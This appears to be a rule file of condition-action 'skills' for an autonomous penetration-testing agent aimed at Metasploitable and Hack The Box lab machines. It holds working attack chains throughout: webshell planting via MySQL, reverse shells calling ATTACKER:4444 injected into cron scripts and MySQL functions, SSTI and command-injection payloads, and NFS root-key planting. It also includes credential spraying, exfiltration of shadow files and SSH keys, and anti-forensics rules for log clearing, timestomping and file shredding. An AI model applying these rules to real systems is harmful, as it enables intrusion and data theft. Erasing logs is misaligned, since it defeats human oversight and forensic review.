skill_001.if_condition: When port list includes 22/80/443 and SSH or HTTP service banners are detected with version strings
skill_001.then_action: Run targeted nmap scripts for SSH- and HTTP-specific enumeration before service exploitation.

skill_002.if_condition: When SSH (port 22) is open and banner is captured
skill_002.then_action: Run ssh enumeration scripts to verify supported authentication methods and weak ciphers.

skill_003.if_condition: When mentor call count exceeds 5 without progress
skill_003.then_action: Document mentor insights, map to actionable steps, then execute highest impact action immediately

skill_ssh_enum.if_condition: When port 22 is open and SSH banner reveals version details
skill_ssh_enum.then_action: Run SSH enumeration with targeted nmap scripts and banner analysis

skill_smb_enum.if_condition: When SMB shares are listed but access denied errors appear
skill_smb_enum.then_action: Use smbclient to list shares and test null session

skill_ssh_enum_01.if_condition: When port 22 is open and SSH banner detected
skill_ssh_enum_01.then_action: Run SSH enumeration with targeted nmap scripts and capture banner details

skill_cred_prioritization.if_condition: When multiple credentials available but no clear priority
skill_cred_prioritization.then_action: Rank credentials by recent password age and reuse likelihood before attempting login

skill_priv_esc_select.if_condition: When SSH access granted but privilege escalation not yet achieved
skill_priv_esc_select.then_action: Enumerate sudo permissions and search for SUID binaries before selecting exploit

skill_web_fuzz.if_condition: When HTTP/HTTPS services respond with 200 OK and directories listed
skill_web_fuzz.then_action: Execute directory and file enumeration (gobuster or dirsearch) to uncover hidden endpoints

skill_recon_banner.if_condition: When port scanning reveals HTTP/SSH banners from open ports
skill_recon_banner.then_action: Capture banner text and map to known service versions with the vulnerability database

skill_recon_ssh.if_condition: When port 22 is open and SSH banner retrieved
skill_recon_ssh.then_action: Execute targeted SSH enumeration using specialized nmap scripts to gather user accounts and authentication mechanisms.

skill_privilege_escalation.if_condition: When initial shell access is constrained to low-privilege user
skill_privilege_escalation.then_action: Run local enumeration scripts (LinEnum/Linux-Exploit-Suggester) to identify privilege escalation paths

skill_ssh_recon.if_condition: When port 22 is open and SSH banner detected
skill_ssh_recon.then_action: Run SSH enumeration with nmap scripts

ms2_vsftpd_backdoor.if_condition: Port 21 open AND service is vsftpd 2.3.4
ms2_vsftpd_backdoor.then_action: exploit/unix/ftp/vsftpd_234_backdoor → root shell. WHY: vsftpd 2.3.4 has a hardcoded backdoor triggered by ':)' in username; opens shell on port 6200.

ms2_samba_usermap.then_action: exploit/multi/samba/usermap_script → root shell. WHY: CVE-2007-2447 allows command injection via username field in Samba 3.0.20-3.0.25rc3; no authentication needed.

ms2_ingreslock_backdoor.then_action: telnet {target} 1524 → instant root shell. WHY: ingreslock is a legacy backdoor that provides root without authentication on port 1524.

ms2_unrealircd_backdoor.then_action: exploit/unix/irc/unreal_ircd_3281_backdoor → root shell. WHY: UnrealIRCd 3.2.8.1 has a backdoor in the PASS command; sends 'AB;' followed by any system command.

ms2_java_rmi_rce.if_condition: Port 1099 open AND Java RMI Registry
ms2_java_rmi_rce.then_action: exploit/multi/misc/java_rmi_server → remote code execution. WHY: Java RMI allows deserialization attacks; MS2's version is unpatched.

ms2_ssh_default_creds.if_condition: Port 22 open AND target is MS2
ms2_ssh_default_creds.then_action: ssh msfadmin@{target} with password 'msfadmin'. WHY: MS2 ships with default credentials msfadmin:msfadmin that are never changed.

ms2_mysql_no_password.then_action: mysql -h {target} -u root → no password required. WHY: MySQL on MS2 has root with empty password, allowing direct database access for credential dumps.

ms2_postgres_default.then_action: psql -h {target} -U postgres (password: postgres), then COPY ... FROM PROGRAM for RCE. WHY: Default creds + COPY FROM PROGRAM = command execution as postgres user.

ms2_vnc_password.then_action: vncviewer {target} with password 'password'. WHY: VNC on MS2 uses trivial password, granting desktop access for GUI-based attacks.

ms2_tomcat_manager.then_action: Login tomcat:tomcat to /manager/html, deploy WAR file with msfvenom shell. WHY: Default Tomcat manager creds allow deploying arbitrary Java applications.

ms2_nfs_to_ssh.then_action: Mount NFS share → write SSH key to /root/.ssh/authorized_keys → ssh root@target. WHY: NFS exports / with no_root_squash, so we can write as root remotely.

ms2_rsh_no_auth.then_action: rsh {target} as root — no authentication required. WHY: Legacy r-services trust .rhosts; MS2 has permissive configuration allowing remote root.

ms2_smtp_enum.then_action: VRFY command to enumerate valid users → build target list for brute-force. WHY: SMTP VRFY reveals which usernames exist, enabling focused credential attacks.

ms2_dvwa_sqli.then_action: sqlmap against DVWA login → extract credentials → escalate. WHY: DVWA has intentional SQL injection in low-security mode; extracting admin hash leads to shell.

ms3_jenkins_groovy.then_action: Access /script console → execute Groovy: 'cmd'.execute(). WHY: Jenkins script console allows arbitrary Groovy code execution as the Jenkins service user.

ms3_tomcat_war_deploy.if_condition: Port 8282 open AND Tomcat on MS3
ms3_tomcat_war_deploy.then_action: Login sploit:sploit to manager → deploy msfvenom WAR shell. WHY: MS3 Tomcat has weak default credentials allowing application deployment.

ms3_elasticsearch_rce.then_action: CVE-2014-3120: MVEL script execution → RCE. WHY: Pre-1.2.0 Elasticsearch allows dynamic scripting, enabling arbitrary code execution via search queries.

ms3_manageengine_upload.if_condition: Port 8020 open AND ManageEngine Desktop Central
ms3_manageengine_upload.then_action: CVE-2015-8249: Unrestricted file upload → webshell → RCE. WHY: ManageEngine has unauthenticated file upload allowing JSP shell deployment.

ms3_ssh_vagrant.if_condition: Port 22 open AND target is MS3
ms3_ssh_vagrant.then_action: ssh vagrant@{target} with password 'vagrant'. WHY: MS3 ships with default vagrant:vagrant credentials for the VM provisioning user.

ms3_struts_rce.if_condition: Port 8282 open AND Apache Struts detected
ms3_struts_rce.then_action: CVE-2017-5638: OGNL injection in Content-Type header → RCE. WHY: Apache Struts Jakarta Multipart parser allows OGNL injection triggering command execution.

htb_sqli_credential_dump.if_condition: Web application with login form AND no input sanitization
htb_sqli_credential_dump.then_action: sqlmap -u URL --forms --dump → extract credentials → SSH with dumped creds. WHY: SQL injection bypasses authentication and extracts stored password hashes.

htb_ssti_to_rce.if_condition: Web app reflects user input in templates (Jinja2, Twig, Smarty)
htb_ssti_to_rce.then_action: Test {{7*7}} → if 49, inject {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. WHY: Template engines evaluate expressions; SSTI chains lead to arbitrary code execution.

htb_file_upload_bypass.if_condition: File upload endpoint detected AND extension filtering present
htb_file_upload_bypass.then_action: Upload .php5/.phtml/.phar with magic bytes → access webshell. WHY: Many filters only check .php extension; alternative extensions bypass the check but still execute.

htb_lfi_to_rce.if_condition: Local File Inclusion vulnerability detected (path traversal)
htb_lfi_to_rce.then_action: LFI to read /etc/passwd → find users → LFI + log poisoning for RCE. WHY: LFI reads arbitrary files; poisoning Apache access.log with PHP code turns LFI into code execution.

htb_suid_privesc.if_condition: Shell obtained AND running as non-root user
htb_suid_privesc.then_action: find / -perm -4000 2>/dev/null → check GTFOBins for exploitable SUID. WHY: SUID binaries run as owner (often root); GTFOBins documents how to escalate via common binaries.

htb_sudo_l_privesc.if_condition: Shell obtained AND user has sudo privileges
htb_sudo_l_privesc.then_action: sudo -l → find NOPASSWD entries → use GTFOBins techniques. WHY: Misconfigured sudo rules (e.g., sudo vim, sudo python) allow trivial root escalation.

htb_kernel_exploit.then_action: uname -r → searchsploit linux kernel → compile and run exploit. WHY: Older kernels have public exploits (DirtyCow, overlayfs) that give instant root.

htb_docker_escape.if_condition: Shell inside Docker container AND docker.sock mounted
htb_docker_escape.then_action: docker run -v /:/host --rm -it alpine chroot /host. WHY: Mounting host filesystem via docker.sock gives full host access from inside the container.

htb_cron_privesc.if_condition: Shell obtained AND writable cron scripts found
htb_cron_privesc.then_action: Inject reverse shell into writable cron job → wait for execution. WHY: Cron jobs run as their configured user; writable scripts owned by root = root shell.

phase_recon_strategy.if_condition: Episode start OR no ports discovered yet
phase_recon_strategy.then_action: Run nmap_quick_scan first, then nmap_service_version. WHY: You must discover the attack surface before you can exploit it. Quick scan finds ports; version scan identifies exploitable services.

phase_enum_strategy.if_condition: Ports discovered AND services not yet fingerprinted
phase_enum_strategy.then_action: Run service-specific enumeration (enum4linux, nikto, gobuster). WHY: Knowing exact versions reveals specific CVEs; enumeration turns 'port 80 open' into 'Apache 2.2.8 with DVWA'.

phase_exploit_timing.if_condition: Services enumerated AND known vulnerabilities identified
phase_exploit_timing.then_action: Exploit the EASIEST path first (backdoors before brute-force). WHY: Backdoors (vsftpd, ingreslock, UnrealIRCd) give instant root; trying complex exploits first wastes steps.

phase_privesc_strategy.if_condition: User shell obtained AND not root
phase_privesc_strategy.then_action: Run linpeas/find_suid/sudo_check in sequence. WHY: LinPEAS finds 90% of privesc vectors; SUID and sudo checks are the most common escalation paths on Linux.

phase_lateral_strategy.if_condition: Root on one host AND other hosts visible on network
phase_lateral_strategy.then_action: Dump credentials from compromised host → spray across network. WHY: Credential reuse is the #1 lateral movement vector; dumped hashes/passwords often work on other hosts.

phase_exfil_strategy.if_condition: Root shell AND sensitive data located
phase_exfil_strategy.then_action: Exfiltrate /etc/shadow, SSH keys, database dumps. WHY: These prove total compromise — shadow file shows password control, SSH keys enable persistent access.

antiforensics_log_clearing.if_condition: CLOSEOUT phase AND shells obtained during engagement
antiforensics_log_clearing.then_action: Clear bash_history, auth.log, wtmp, btmp, syslog IN ORDER. WHY: Logs record every action; clearing from most specific (bash_history) to most general (syslog) ensures no trace of commands remains.

antiforensics_timestomp.if_condition: CLOSEOUT phase AND files modified during engagement
antiforensics_timestomp.then_action: touch -r /etc/hosts <modified_file> to restore timestamps. WHY: File timestamps are forensic evidence; timestomping makes modified files appear unaltered.

antiforensics_shred.if_condition: CLOSEOUT phase AND tools/payloads left on target
antiforensics_shred.then_action: shred -vfzu -n 5 <file> for secure deletion. WHY: rm only removes directory entries; shred overwrites data blocks making file recovery impossible.

antiforensics_ssh_fingerprint.if_condition: CLOSEOUT phase AND SSH was used during engagement
antiforensics_ssh_fingerprint.then_action: Remove target from ~/.ssh/known_hosts. WHY: known_hosts entries prove you connected to the target; removing them eliminates SSH forensic evidence on attacker machine.

ms2_hard_mysql_webshell.if_condition: HARD difficulty AND Port 3306 open AND MySQL no-password
ms2_hard_mysql_webshell.then_action: mysql -h {target} -u root → SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php' → curl http://{target}/shell.php?c=id. WHY: When backdoors are blocked, MySQL's INTO OUTFILE writes a webshell to Apache's docroot. No exploit module needed — just SQL.

ms2_hard_nfs_chain.then_action: showmount -e {target} → mount -t nfs {target}:/ /mnt → ssh-keygen → write pubkey to /mnt/root/.ssh/authorized_keys → ssh root@{target}. WHY: NFS with no_root_squash lets us write as root remotely. This 4-step chain gives persistent root access without any exploit.

ms2_hard_tomcat_war.if_condition: HARD difficulty AND Port 8180 open AND Tomcat
ms2_hard_tomcat_war.then_action: msfvenom -p java/jsp_shell_reverse_tcp → curl --upload-file shell.war http://tomcat:tomcat@{target}:8180/manager/deploy → trigger. WHY: Tomcat default creds (tomcat:tomcat) allow WAR deployment. This is a CREDENTIAL-based exploit — not blocked by hard mode.

ms2_hard_postgres_rce.if_condition: HARD difficulty AND Port 5432 open AND PostgreSQL
ms2_hard_postgres_rce.then_action: psql -h {target} -U postgres → CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;. WHY: PostgreSQL COPY FROM PROGRAM executes OS commands. Default creds (postgres:postgres) + SQL RCE = shell without exploit modules.

ms2_hard_web_dvwa_chain.if_condition: HARD difficulty AND Port 80 open AND DVWA detected
ms2_hard_web_dvwa_chain.then_action: dirb http://{target} → login DVWA (admin:password) → SQL injection in vuln pages → extract /etc/passwd via UNION SELECT LOAD_FILE → crack hashes → SSH. WHY: Multi-step web chain using DVWA's intentional vulns. Teaches enumeration→exploitation→post-exploitation arc.

ms2_hard_distcc_privesc.if_condition: HARD difficulty AND Port 3632 open AND distccd
ms2_hard_distcc_privesc.then_action: exploit/unix/misc/distcc_exec → daemon user shell → find / -perm -4000 → nmap --interactive → !sh for root. WHY: distccd gives low-priv shell (daemon). Old nmap with SUID has --interactive mode → shell escape to root. Two-step chain.

ms2_hard_php_cgi_chain.if_condition: HARD difficulty AND Port 80 open AND PHP-CGI detected
ms2_hard_php_cgi_chain.then_action: nikto -h {target} → discover /cgi-bin/ → exploit/multi/http/php_cgi_arg_injection → www-data shell → kernel privesc. WHY: PHP-CGI argument injection (CVE-2012-1823) gives www-data shell. Then enumerate kernel version for privilege escalation.

strategy_difficulty_adaptation.then_action: STOP trying backdoors. Enumerate: MySQL(3306), PostgreSQL(5432), NFS(2049), Tomcat(8180), DVWA(80), distccd(3632). These are the MULTI-STEP vectors. WHY: Hard mode specifically blocks single-step root paths. The agent must pivot to credential-based and web-based chains.

strategy_parallel_vectors.if_condition: Single exploit path is failing or stuck
strategy_parallel_vectors.then_action: Maintain 3+ parallel attack vectors simultaneously. If MySQL fails, try NFS. If NFS fails, try web. WHY: Real penetration tests never rely on a single vector — redundancy is key.

strategy_credential_spray.if_condition: Credentials found AND multiple services open
strategy_credential_spray.then_action: Test found credentials against ALL open services (SSH, Telnet, MySQL, FTP). WHY: Credential reuse is the #1 post-exploitation technique. Users reuse passwords across services 70%+ of the time.

strategy_exploit_ordering.then_action: Priority: backdoors(instant) → default creds(fast) → known CVE exploits(reliable) → web vulns(complex) → brute force(slow). WHY: Efficiency matters. The fastest path to root uses the least steps and has the highest probability of success.

ms3_mysql_udf_chain.if_condition: MS3 target AND Port 3306 open AND MySQL
ms3_mysql_udf_chain.then_action: mysql -h {target} -u root -p'sploitme' → CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; → SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'). WHY: UDF (User-Defined Functions) allow executing system commands from MySQL. MS3's weak password 'sploitme' gives initial access.

ms3_wordpress_to_shell_chain.if_condition: MS3 target AND Port 80 open AND WordPress detected
ms3_wordpress_to_shell_chain.then_action: wpscan --enumerate ap → find vulnerable plugin → exploit OR login admin:admin → Appearance → Theme Editor → inject PHP reverse shell into 404.php. WHY: WordPress admin can edit theme files, injecting PHP code that executes on page load.

strategy_target_switching.if_condition: Current target fully compromised to CLOSEOUT
strategy_target_switching.then_action: Switch targets: if on MS2 → consider MS3. Carry over learned strategies, adjust for new service landscape. WHY: Cross-target transfer learning is the hallmark of a skilled pentester — patterns transfer but details differ.

htb_idor_sequential_ids.if_condition: Web app uses sequential IDs in URL paths (e.g., /data/5, /user/3, /capture/1)
htb_idor_sequential_ids.then_action: Test IDOR by changing ID to 0 or other low values. Download any files found (especially .pcap captures). WHY: Sequential IDs mean no authorization check — any user's data is accessible by changing the number. ID=0 often has admin/initial data. Source: Cap walkthrough.

htb_pcap_cleartext_creds.if_condition: PCAP/network capture file obtained (from IDOR, file download, or share)
htb_pcap_cleartext_creds.then_action: tshark -r file.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' OR open in Wireshark and filter for ftp/http/telnet. WHY: FTP/Telnet transmit credentials in cleartext. PCAP files are goldmines for credential harvesting. Source: Cap walkthrough.

htb_linux_capabilities_privesc.if_condition: Linux user shell AND getcap shows cap_setuid on python3 or perl
htb_linux_capabilities_privesc.then_action: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' → instant root. WHY: cap_setuid allows the binary to change its UID. Python can call os.setuid(0) to become root, then spawn a root bash shell. Source: Cap walkthrough.

htb_ssrf_filtered_ports.if_condition: Nmap shows filtered ports AND an SSRF-capable web app on an open port
htb_ssrf_filtered_ports.then_action: Configure SSRF proxy (e.g., Request Baskets forward_url=http://127.0.0.1:FILTERED_PORT) to reach internal services through the target. WHY: Filtered ports are reachable from localhost. SSRF lets us proxy through the target to reach internal-only services. Source: Sau walkthrough (CVE-2023-27163).

htb_systemctl_pager_root.then_action: sudo /usr/bin/systemctl status anything → when pager opens, type !sh → root shell. WHY: systemctl uses 'less' as its pager. In less, !command spawns a shell. Since systemctl runs as root via sudo, the spawned shell is root. Source: Sau walkthrough.

htb_ftp_webroot_overlap.if_condition: FTP anonymous write enabled AND FTP root contains web server files (iisstart.htm, index.html)
htb_ftp_webroot_overlap.then_action: Generate webshell (msfvenom ASPX for IIS, PHP for Apache) → upload via FTP → trigger via HTTP. WHY: FTP root = web root means anything uploaded via FTP is accessible via the web server. Upload code = instant RCE. Source: Devel walkthrough.

htb_windows_kernel_privesc.if_condition: Windows shell obtained AND systeminfo shows old build (Win7 7600, Win2008, etc.)
htb_windows_kernel_privesc.then_action: Use windows-exploit-suggester or search for specific kernel exploit. Win7 Build 7600 = MS11-046 (afd.sys). Compile/download exploit, transfer via certutil, execute for SYSTEM. Source: Devel walkthrough.

htb_heartbleed_memory_leak.if_condition: Port 443 open AND OpenSSL version is 1.0.1-1.0.1f
htb_heartbleed_memory_leak.then_action: nmap --script ssl-heartbleed -p 443 {target} → if vulnerable, run heartbleed exploit multiple times → search leaked memory for passwords, session tokens, base64 strings. WHY: Heartbleed leaks 64KB of server process memory per request. Multiple attempts leak different memory regions. Source: Valentine walkthrough.

htb_tmux_session_hijack.if_condition: Linux user shell AND tmux/screen sessions running as root (found via find / -name '*tmux*' or tmux ls)
htb_tmux_session_hijack.then_action: tmux -S /path/to/root/socket attach → instant root. WHY: Tmux sessions persist and can be attached to by anyone with access to the socket file. Root sessions = instant root. Source: Valentine walkthrough.

htb_cron_script_replacement.if_condition: Linux user shell AND writable script found in /scripts or /opt that runs as root cron
htb_cron_script_replacement.then_action: Replace script content with: import os; os.system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1') → wait for cron execution → root shell. WHY: Cron executes scripts at intervals. If the script is writable, replacing its content gives root on next execution. Source: Bashed walkthrough.

htb_webapp_config_cred_reuse.then_action: cat config.php conf.php .env wp-config.php settings.py → extract DB credentials → try same password for SSH login. WHY: Developers reuse passwords across services. Web app DB password = SSH password is extremely common. Source: BoardLight, TwoMillion walkthroughs.

htb_subdomain_vhost_fuzzing.if_condition: Web server returns hostname redirect OR only SSH+HTTP ports open with nothing on main page
htb_subdomain_vhost_fuzzing.then_action: ffuf -u http://{target} -H 'Host: FUZZ.domain.htb' -w subdomains-top1million-5000.txt -fs DEFAULT → discover hidden applications on subdomains. WHY: Virtual hosting hides different apps on subdomains. The real attack surface is often on a subdomain, not the main domain. Source: BoardLight, Analytics walkthroughs.

htb_env_var_cred_leak.if_condition: Shell inside a Docker container or application sandbox
htb_env_var_cred_leak.then_action: env | grep -i 'pass\|secret\|key\|token' → try leaked credentials for SSH to host. WHY: Containers receive secrets via environment variables. These often include host-level passwords. Source: Analytics walkthrough.

htb_overlayfs_kernel_privesc.if_condition: Ubuntu 22.04 OR kernel 5.15-6.2 AND user shell obtained
htb_overlayfs_kernel_privesc.then_action: Run OverlayFS exploit (CVE-2023-2640/CVE-2023-32629): single-command unshare + overlay mount → root. WHY: Ubuntu 22.04 kernels have a specific OverlayFS bug allowing SUID bypass. Source: Analytics, TwoMillion walkthroughs.

htb_api_command_injection.if_condition: Web API endpoint that generates files or configs (VPN, reports, exports)
htb_api_command_injection.then_action: Test parameter values with ;id; to check for command injection. If confirmed, inject reverse shell via base64: ;echo BASE64_SHELL | base64 -d | bash;. WHY: File generation APIs often pass parameters to system commands. Source: TwoMillion walkthrough.

htb_shadow_backup_crack.if_condition: Linux shell AND /backup/ directory exists OR find reveals shadow backup files
htb_shadow_backup_crack.then_action: cat /backup/shadow.backup → john --wordlist=rockyou.txt shadow_hashes → su with cracked password. WHY: Admins create shadow backups with weaker permissions. These contain crackable password hashes. Source: Sunday walkthrough.

htb_finger_enumeration.then_action: finger @{target} → enumerate users → finger username@{target} for details → hydra SSH brute force with discovered usernames. WHY: Finger reveals valid system usernames, eliminating half the brute force problem. Source: Sunday walkthrough.

htb_wget_sudo_privesc.then_action: Use GTFOBins wget: sudo wget --use-askpass=/path/to/script http://attacker → root. WHY: wget's --use-askpass executes an arbitrary program to get proxy password, running it as root via sudo. Source: Sunday walkthrough.

htb_db_file_hash_extraction.if_condition: Application uses embedded database (Derby, H2, SQLite) AND user shell obtained
htb_db_file_hash_extraction.then_action: find /opt -name '*.dat' -o -name '*.db' → grep for hash patterns (SHA1, MD5, bcrypt) → extract and crack with hashcat/john. WHY: Embedded DBs store hashes in raw data files, not just SQL tables. grep through .dat files. Source: Bizness walkthrough.

htb_ad_gpp_decrypt.if_condition: Windows Active Directory target AND SMB Replication/SYSVOL share accessible
htb_ad_gpp_decrypt.then_action: Find Groups.xml → extract cPassword → gpp-decrypt → get service account creds → Kerberoast with GetUserSPNs.py. WHY: Microsoft published the AES key for GPP encryption. ALL GPP passwords are trivially decryptable. Source: Active walkthrough.

htb_default_creds_before_brute.if_condition: CMS or admin panel login page found (Dolibarr, WordPress, OFBiz, Jenkins, etc.)
htb_default_creds_before_brute.then_action: ALWAYS try default credentials FIRST: admin:admin, admin:password, root:root, tomcat:tomcat. WHY: Default credentials are instant access. Brute force is slow, noisy, and may trigger lockout. Source: BoardLight (admin:admin on Dolibarr), Bizness (OFBiz defaults).

htb_js2py_sandbox_escape.if_condition: Flask web app using js2py to evaluate user JavaScript (check requirements.txt)
htb_js2py_sandbox_escape.then_action: Use CVE-2024-28397 payload to escape js2py sandbox → navigate Python MRO → find subprocess.Popen → execute commands. WHY: js2py ≤0.74 allows JavaScript to access Python internals via __class__.__base__.__subclasses__(). Source: CodePartTwo walkthrough.

htb_sqlite_hash_dump.if_condition: Application shell AND SQLite database found (*.db, *.sqlite3 files)
htb_sqlite_hash_dump.then_action: sqlite3 database.db 'SELECT * FROM user' → extract password hashes → crack with CrackStation (MD5) or hashcat. WHY: Application databases contain user credentials. MD5 hashes crack instantly. Source: CodePartTwo walkthrough.

htb_backup_tool_abuse.if_condition: sudo -l shows NOPASSWD for backup tool (npbackup-cli, restic, etc.) AND config file is modifiable
htb_backup_tool_abuse.then_action: Copy config, modify backup paths to target /root, run sudo backup-tool -c modified_config -b → restore to read root files. WHY: Backup tools with sudo can read any directory when given a custom config. Source: CodePartTwo walkthrough.

skill_cred_extract.if_condition: When valid SSH credentials fail to authenticate
skill_cred_extract.then_action: Capture response codes and rerun password spray with adjusted wordlist

skill_port_followup.if_condition: When host scan returns services but no credentials collected
skill_port_followup.then_action: Trigger structured follow-up probing using service-specific enumeration (http-enum, smb-os-discovery).

skill_http_enum.if_condition: When port 80/443 responds with web service
skill_http_enum.then_action: Execute gobuster with common directories + nikto for web-level vulnerabilities

skill_rs_ssh_banner.if_condition: When SSH service responds with identifiable banner and open port 22
skill_rs_ssh_banner.then_action: Run targeted SSH enumeration with nmap ssh scripts and follow up with credential bruteforce where allowed

skill_priv_esc_linux.if_condition: When Linux host identified and user access obtained but no privilege escalation
skill_priv_esc_linux.then_action: Check sudo permissions and kernel exploits using linpeas/Tmux automated checks

skill_smb_hash_capture.if_condition: When SMB shares accessible and creds unknown
skill_smb_hash_capture.then_action: Use smbclient enumeration and hashdump scripts to capture credential artifacts

skill_mentor_sync.then_action: Log instructions and verify compliance before next action

skill_web_enum.if_condition: When HTTP/HTTPS port returns 200 and includes application-specific headers
skill_web_enum.then_action: Deploy web directory brute-force and banner grabbing to map application entry points

skill_cred_harvest.if_condition: When harvested credentials appear in default credential list
